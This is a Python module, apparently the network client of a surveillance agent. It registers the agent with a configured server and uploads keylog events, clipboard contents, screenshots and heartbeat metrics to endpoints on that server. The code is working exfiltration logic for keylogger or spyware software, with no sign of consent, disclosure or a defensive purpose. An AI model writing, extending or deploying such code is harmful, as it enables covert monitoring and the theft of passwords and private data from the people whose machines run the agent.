import os
import requests
from config.settings import SERVER_URL

def register_agent(data):
    """
    Register a new agent with the server and return the assigned agent ID.
    """
    r = requests.post(f"{SERVER_URL}/agents/register", json=data)
    r.raise_for_status() 
    
    return r.json()["id"]

def send_metrics(agent_id, data):
    """
    Send heartbeat metrics to the server.
    """
    r = requests.post(f"{SERVER_URL}/metrics/{agent_id}", json=data)
    
    r.raise_for_status()

def send_keylogs(agent_id, logs):
    """
    Send keylog events to the server.
    """
    r = requests.post(
        f"{SERVER_URL}/keylogs/{agent_id}",
        json={"events": logs},
        timeout=5
    )

    r.raise_for_status()

def send_clipboards(agent_id, events):
    """
    Send clipboard events to the server.
    """
    r = requests.post(
        f"{SERVER_URL}/clipboards/{agent_id}",
        json={"events": events},
        timeout=5
    )

    r.raise_for_status()

def upload_screenshot(agent_id, filepath):
    """
    Upload screenshot bytes to the server endpoint.
    """
    with open(filepath, "rb") as f:
        files = {"file": (os.path.basename(filepath), f, "image/jpeg")}
        r = requests.post(
            f"{SERVER_URL}/screenshots/{agent_id}",
            files=files,
            timeout=15
        )
        r.raise_for_status()

    return r.json() if r.headers.get("Content-Type", "").startswith("application/json") else {"status": "uploaded"}
